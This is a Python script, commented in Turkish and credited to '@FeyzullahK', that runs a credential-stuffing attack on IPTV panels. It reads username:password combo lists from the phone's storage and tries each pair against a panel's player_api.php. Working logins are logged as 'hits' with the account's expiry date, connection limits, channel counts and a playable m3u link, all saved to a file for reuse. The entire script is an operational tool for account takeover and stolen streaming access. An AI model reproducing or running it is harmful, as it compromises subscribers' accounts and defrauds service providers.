import os,pip
try:
	import requests
except:
	print("requests modulu yüklü değil \n requests modulü yükleniyor \n")
	pip.main(['install', 'requests'])
	import requests

import random,time, datetime
import subprocess
import pathlib,re

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)

ses= requests.Session()

try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass


subprocess.run(["clear", ""])
say=0
hit=0
bul=0
cpm=1

feyzo=("""
\33[32m
 ▰▰▰▰ᴘʏᴛʜᴏɴ ᴍᴏʙɪʟ ᴍ𝟹ᴜ ᴛᴀʀᴀᴍᴀ▰▰▰▰ ''\33[0m\n
Bu çalışma @FeyzullahK tarafından kodlanmıştır. 
Hiçbir kaynak kullanılmamış ve alıntı yapılmamıştır. 
Config=m3u-combolu-v13
 ▰▰▰▰▰▰▰ 𝙈𝙧.𝙁𝙚𝙮𝙯𝙤@ ▰▰▰▰▰▰▰  '' " '
\33[0m""") 

print(feyzo) 
#=========++===+++++========++
 #Combo adını giriniz (user:pass)
 #dahili hafıza ana dizine atınız   
#combo =input("""
#MAC combonuzun adını yazınız...!
#	\33[1mDosya Adı=""") 

	
say=0
dsy=""
dir='/sdcard/combo/'
for files in os.listdir (dir):
	#if files.endswith(".txt"):
	say=say+1
	dsy=dsy+"	"+str(say)+"-) "+files+'\n'
print ("""Aşağıdaki listeden combonuzu seçin!!!
	
 """+dsy+"""
 
\33[33mCombo klasörünüzde """ +str(say)+""" adet dosya bulundu !
""")

dsyno=str(input(" \33[31mCombo No =\33[0m"))
say=0
for files in os.listdir (dir):
	#if files.endswith(".txt"):
	say=say+1
	if dsyno==str(say):
		dosyaa=(dir+files)
say=0

print(dosyaa) 


		
						
dsy=dosyaa#'/sdcard/'+combo+'.txt'
combo=dsy
dosya=""
file = pathlib.Path(dsy)
if file.exists ():
    print ("Dosya Bulundu")
else:
    print("\33[31mDosya Bulunamadı..! \33[0m") 
    dosya="yok"
#print(len(feyzo)) 
if dosya=="yok" :
    exit() 
    
subprocess.run(["clear", ""])
print(feyzo) 

#Panel ve Portu yazın (portaliptv.com:8080)
#print(feyzo) 
print("""
Seçilen dosya: """ + dsy) 
#################
panel = input("""
	\33[1mʟüᴛғᴇɴ ᴘᴀɴᴇʟ ᴀᴅıɴı ʏᴀᴢıɴıᴢ.. ? \n\n
Panel:Port=\33[0m\33[31m\33[1m""")
#=======+++=++++++====++=======
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
portal=panel
fx=portal.replace(':','_')
def yaz(kullanici): 
    dosya=open('/sdcard/m3u@'+fx+'.txt','a+') 
    dosya.write(kullanici) 
    dosya.close() 

for fyz in open(combo, 'r'):  # 
 fyzz = fyz.split(":")
 
 userr=fyzz[0].replace(" ","")
 #userr=userr.lower()
 passs=fyzz[1].replace(" ","")
 passs=passs.replace('\n',"")
 #passs=passs.lower()
 
 
 link="http://"+portal+"/player_api.php?username="+userr+"&password="+passs+"&type=m3u"
 response = ses.get(link)
 say = int(say) +1
 cpm=(time.time()-cpm)
 cpm=(round(60/cpm))
 fyz=fyz.replace('\n',"")
 
 print ("\33[0m" +userr+"-"+passs+" \33[32m" +portal+'\033[96m\n' +"      >>>>>Total:" + str(say)+" \33[31mHit:" + str(hit)+"\33[94m Cpm:" +str(cpm)+"\033[0m")
 cpm=time.time()
 veri=str(response.text)
 chk=veri[:23]
 chk=chk[15:]
 
 if 'username' in veri:
     
     sound="/sdcard/kemik_sesi.mp3"
     file = pathlib.Path(sound)
     try:
     	if file.exists ():
     		ad.mediaPlay(sound)
     except:pass
     	
     panel=portal
     userm=userr
     pasdm=passs
     url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_live_streams"
     kate= "http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_live_categories"
     res = ses.get(url5,timeout=15, verify=False)
     veri=str(res.text)
     kanalsayisi=""
     if 'stream_id' in veri:
     	kanalsayisi=str(veri.count("stream_id"))
     	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_vod_streams"
     	res = ses.get(url5, timeout=15, verify=False)
     	veri=str(res.text)
     	filmsayisi=str(veri.count("stream_id"))
     	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_series"
     	res = ses.get(url5,  timeout=15, verify=False)
     	veri=str(res.text)
     	dizisayisi=str(veri.count("series_id"))
     	
     hit=int(hit)+1
     result=veri
     veri=(response.text)
     acon=""
     acon=veri.split('active_cons":')[1]
     acon=acon.split(',')[0]
     acon=acon.replace('"',"")
     mcon=veri.split('max_connections":')[1]
     mcon=mcon.split(',')[0]
     mcon=mcon.replace('"',"")
     status=veri.split('status":')[1]
     status=status.split(',')[0]
     status=status.replace('"',"")
     timezone=veri.split('timezone":"')[1]
     timezone=timezone.split('",')[0]
     timezone=timezone.replace("\/","/")
     if 1==1:
    		realm=veri.split('url":')[1]
    		realm=realm.split(',')[0]
    		realm=realm.replace('"',"")
    		portal=panel
    		port=veri.split('port":')[1]
    		port=port.split(',')[0]
    		user=veri.split('username":')[1]
    		user=user.split(',')[0]
    		user=user.replace('"',"")
    		passw=veri.split('password":')[1]
    		passw=passw.split(',')[0]
    		passw=passw.replace('"',"")
    		bitis=veri.split('exp_date":')[1]
    		bitis=bitis.split(',')[0]
    		bitis=bitis.replace('"',"")
    		if bitis=="null":
            		bitis="Unlimited"
    		else:
            		bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S'))
    		bitis=bitis
    		mlink="http://"+ panel + "/get.php?username=" + userm + "&password=" + pasdm + "&type=m3u_plus"
    		mt=("""
╭─ᴘʏᴛʜᴏɴ ᴍᴏʙɪʟ ᴍ𝟹ᴜ ᴛᴀʀᴀᴍᴀ
├●🌐 Host ➤ http://"""+portal+"""
├●🌍 Real ➤ http://"""+realm+"""
├●📡 Port ➤ """+port+"""
├●👩‍ User ➤ """+user+"""
├●🔑 Pass ➤ """+passw+"""
├●📆 Exp. ➤ """+bitis+""" 
├●👩 Act Con ➤ """+acon+"""
├●👪 Max Con ➤ """+mcon+""" 
├●🌐 Status ➤ """+status+"""
├●⏰ TimeZone➤ """+timezone+"""
├──── 🅵🅴🆈🆉🅾️""")

    		if not kanalsayisi =="":
    			sayi=("""
├●🎬 Kanal Sayısı➤"""+kanalsayisi+"""
├●🎬 Film Sayısı➤"""+filmsayisi+"""
├●🎬 Dizi Sayısı➤"""+dizisayisi+"""
├──── @FeyzullahK""")
    		mtl=("""
├●🔗m3u_Url➤"""+mlink+"""
▰▰ᴾʸᵗʰᵒⁿ ᴾʳᵒᵍʳᵃᵐᵐᵉʳ ᵇʸ ᶠᵉʸᶻᵒ▰▰
""")


    		print(mt+sayi+mtl)

    		yaz(mt+sayi+mtl+'\n')